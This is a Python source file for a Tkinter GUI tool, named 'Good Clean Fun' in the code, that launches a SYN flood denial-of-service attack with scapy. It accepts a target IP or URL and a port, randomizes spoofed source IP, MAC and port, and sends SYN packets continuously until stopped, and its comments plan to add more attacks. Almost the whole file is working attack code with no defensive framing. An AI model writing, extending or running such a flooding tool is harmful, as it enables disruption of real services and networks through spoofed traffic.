#!/usr/bin/python

#TODO
#   actually use the TCP/UDP Message and actually utilize UDP
#   switch to sendpfast
#   implement more attacks
#   sendp doesn't show up in tcpdump. why?
#   UPDATE: investigate sendp not showing up in tcpdump because it just did
#       when I tried today

from Tkinter import *
from scapy.all import *
import random, re, time, socket, ctypes, os

try:
    is_admin = os.getuid() == 0
except:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()

class NotAdmin:
    def __init__(self, master):
        master.title('Ya Dun Goofed')
        master.minsize(240, 50)
        master.geometry('240x100')
        Label(master, text='Administrator Privileges Required').grid(row=0,
                        sticky=N+S+E+W)
        Button(master, text='OK', width=15, height=2,
            command=lambda: meh.destroy()).grid(row=2, sticky=N+S+E+W)

class Proj:
    def __init__(self, master):
        self.attacking = False
        self.attackInit = False
        master.title('Good Clean Fun')
        master.minsize(575, 375)
        master.geometry('600x375')
        #Make sure everything resizes nicely
        master.grid_columnconfigure(2, weight=1, minsize=200)
        master.grid_rowconfigure(7, weight=1)

        #Attack listbox
        alist = ['Synflood']
        self.attkList = Listbox(master)
        self.attkList.insert(END, *alist)
        Label(master, text='Attack:').grid(row=0, column=0, sticky=W)
        self.attkList.grid(row=1, column=0, rowspan=4)

        #Src IP fields and random button
        Label(master, text='Src IP:').grid(row=0, column=1, sticky=E)
        self.srcIpbox = Entry(master)
        self.srcIpbox.grid(row=0, column=2, sticky=E+W)
        self.randoSrc = BooleanVar()
        self.randoIpbox = Checkbutton(master, text='Randomize',
                               variable=self.randoSrc,
                               command=lambda: self.toggleEntry(self.srcIpbox))
        self.randoIpbox.grid(row=0, column=3)

        #Dst IP and URL fields
        self.dstType = IntVar()
        self.ipRad = Radiobutton(master, text='Dst IP:', variable=self.dstType,
            value=1, command=lambda: self.toggleIpUrl())
        self.ipRad.grid(row=1, column=1, sticky=E)
        self.dstIpbox = Entry(master)
        self.dstIpbox.grid(row=1, column=2, sticky=E+W)
        self.urlRad = Radiobutton(master, text='URL:', variable=self.dstType,
            value=2, command=lambda: self.toggleIpUrl())
        self.urlRad.grid(row=2, column=1, sticky=E)
        self.urlbox = Entry(master)
        self.urlbox.grid(row=2, column=2, sticky=E+W)
        self.ipRad.select()
        self.toggleIpUrl()

        #Dst Port fields
        Label(master, text='Dst Port:').grid(row=3, column=1, sticky=E)
        self.dstportbox = Entry(master)
        self.dstportbox.grid(row=3, column=2, sticky=E+W)
        self.randoDstPort = BooleanVar()
        self.randoDstPortbox = Checkbutton(master, text='Randomize',
                             variable=self.randoDstPort,
                             command=lambda: self.toggleEntry(self.dstportbox))
        self.randoDstPortbox.grid(row=3, column=3)

        #TCP/UDP Message
        Label(master, text='TCP/UDP Message:').grid(row=4, column=1, sticky=E)
        self.msgbox = Entry(master)
        self.msgbox.grid(row=4, column=2, sticky=E+W)

        #Start/Stop and Quit Buttons
        #Label(master).grid(row=4)
        self.start = Button(master, text='Start', width=20, height=2,
                command=lambda: self.startstop(master))
        self.start.grid(row=6, column=2, sticky=N+S+E)
        self.quit = Button(master, text='Quit',
                command=lambda: self.stop(True))
        self.quit.grid(row=6, column=3, sticky=N+S+E+W)

        #Console so you know wtf is going on (sort of)
        self.sb = Scrollbar(master)
        self.sb.grid(row=7, column=6, rowspan=3, sticky=N+S)
        self.console = Text(master, state='disabled', background='black',
                      foreground='white', yscrollcommand=self.sb.set)
        self.console.grid(row=7, column=0, rowspan=3, columnspan=5, sticky=N+S+E+W)
        self.sb.config(command=self.console.yview)
        self.hidden = BooleanVar()
        self.hideConsole = Checkbutton(master, text='Hide Console',
                               variable=self.hidden,
                               command=lambda: self.toggleConsole(master))
        self.hideConsole.grid(row=6, column=0)

    #Toggle the presence of the console
    #TODO not static
    def toggleConsole(self, master):
        width, height = master.winfo_width(), master.winfo_height()
        conHeight = self.console.winfo_height()
        if self.hidden.get() is False:
            self.console.grid()
            self.sb.grid()
            master.minsize(575, 375)
        else:
            self.console.grid_remove()
            self.sb.grid_remove()
            master.minsize(575, 235)
            if height >= 375:
                newHeight = height - conHeight
                if newHeight < 235:
                    newHeight = 235
                x, y = master.winfo_x(), master.winfo_y()
                master.geometry('%dx%d+%d+%d'% (width, newHeight,
                                x - 1, y - 28))

    #Toggle the state of a given entry
    def toggleEntry(self, ent):
        if ent['state'] == 'normal':
            ent.configure(state='disabled')
        else:
            ent.configure(state='normal')

    #Toggle the state of Ip and URL entries
    def toggleIpUrl(self):
        var = self.dstType.get()
        if var == 1:
            self.dstIpbox.configure(state='normal')
            self.urlbox.configure(state='disabled')
        elif var == 2:
            self.urlbox.configure(state='normal')
            self.dstIpbox.configure(state='disabled')
        else:
            print 'toggle problem'

    #Randomly Generate an IP Address
    def randIp(self):
        return '%d.%d.%d.%d'% (
                    random.randint(1,254),
                    random.randint(1,254),
                    random.randint(1,254),
                    random.randint(1,254))

    #Randomly generate a port number
    def randPort(self):
         return '%d'% random.randint(1024,49151)

    #Start or stop the attack
    # @param master: window. used to relabel
    def startstop(self, master):
        if self.attacking is True:
            self.stop(False)
            self.start.config(text="Start")
            self.attacking = False
        else:
            #validate Ips and port
            testPass = True
            srcIp = self.srcIpbox.get()
            dstIp = self.dstIpbox.get()
            url = self.urlbox.get()
            dstport = self.dstportbox.get()

            ipreg = '^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
            urlIp = socket.gethostbyname(url)
            urlValid = None
            srcValid = re.match(ipreg, srcIp)
            dstValid = re.match(ipreg, dstIp)
            dstportValid = re.match('^[0-9]*$', dstport)
            if urlIp is not None:
                urlValid = re.match(ipreg, urlIp)
            if dstportValid is not None and dstport is not None and dstport != '':
                dstportNum = int(dstport, 0)
            #actual validitty checks
            if (srcValid is None or srcIp == '') and not self.randoSrc.get():
                Label(master, fg='red',text='Src IP:').grid(row=0, column=1,
                                                            sticky=E)
                testPass = False
            else:
                Label(master, text='Src IP:').grid(row=0, column=1, stick=E)
            if self.dstType.get() == 1 and (dstValid is None or dstIp == ''):
                self.ipRad.configure(fg='red')
                testPass=False
            else:
                self.ipRad.configure(fg='black')
            if self.dstType.get() == 2 and (urlValid is None or url == ''):
                self.urlRad.configure(fg='red')
                testPass = False
            else:
                self.urlRad.configure(fg='black')
            if (dstportValid is None or dstport == '' or dstportNum < 0 or dstportNum > 65535) and not self.randoDstPort.get():
                Label(master, fg='red', text='Dst Port:').grid(row=3, column=1,
                                                               stick=E)
                testPass = False
            else:
                Label(master, text='Dst Port:').grid(row=3, column=1, stick=E)
            if testPass:
                self.start.config(text="Stop")
                self.attacking = True
                self.attk(master)
                #start attack

    #Attack the dstIp
    # @param master: window. used to recall the function
    def attk(self, master):
        if self.attacking is True:
            if self.attackInit is False:
                self.attackInit = True
                self.srcIp = self.srcIpbox.get()
                self.dstport = self.dstportbox.get()
                attkType = self.attkList.get(ACTIVE)
                self.dest = ''
                if self.dstType.get() == 1:
                    self.dest = self.dstIpbox.get()
                elif self.dstType.get() == 2:
                    self.dest = socket.gethostbyname(self.urlbox.get())
                #disable all input boxes
                self.toggleEntry(self.attkList)
                if self.randoSrc.get() is False:
                    self.toggleEntry(self.srcIpbox)
                if self.randoDstPort.get() is False:
                    self.toggleEntry(self.dstportbox)
                if self.dstType.get() == 1:
                    self.toggleEntry(self.dstIpbox)
                else:
                    self.toggleEntry(self.urlbox)
            if self.randoSrc.get() is True:
                self.srcIp = self.randIp()
            if self.randoDstPort.get() is True:
                self.dstport = self.randPort()
            eth = Ether(src=RandMAC())
            ip = IP(src=self.srcIp, dst=self.dest)
            tcp = TCP(dport=int(self.dstport), flags='S')
            self.attackMsg = 'Syn to %s through port %s from %s' %(
                           self.dest, self.dstport, self.srcIp)
            self.console.configure(state='normal')
            self.console.insert(END, '%s\n'% self.attackMsg)
            self.console.configure(state='disabled')
            self.console.yview(END)
            master.after_idle(self.attk, master)
            sendp(eth/ip/tcp)

    #Stop the attack, quit program if it is wanted
    # @param quitting: Boolean that tells whether or
    #   not to stop the program
    def stop(self, quitting):
        if self.attacking is True:
            self.start.config(text="Start")
            self.attacking = False
            self.attackInit = False
            #enable all widgets
            self.toggleEntry(self.attkList)
            if self.randoSrc.get() is False:
                self.toggleEntry(self.srcIpbox)
            if self.randoDstPort.get() is False:
                self.toggleEntry(self.dstportbox)
            if self.dstType.get() == 1:
                self.toggleEntry(self.dstIpbox)
            else:
                self.toggleEntry(self.urlbox)
        if quitting is True:
            root.destroy()

if not is_admin:
    print 'Administrator Privileges Required'
    meh = Tk()
    err = NotAdmin(meh)
    meh.mainloop()

#Jus do the thing!
root = Tk()
proj = Proj(root)
root.attacking = False
if root.attacking:
    root.attk(master)
root.mainloop()
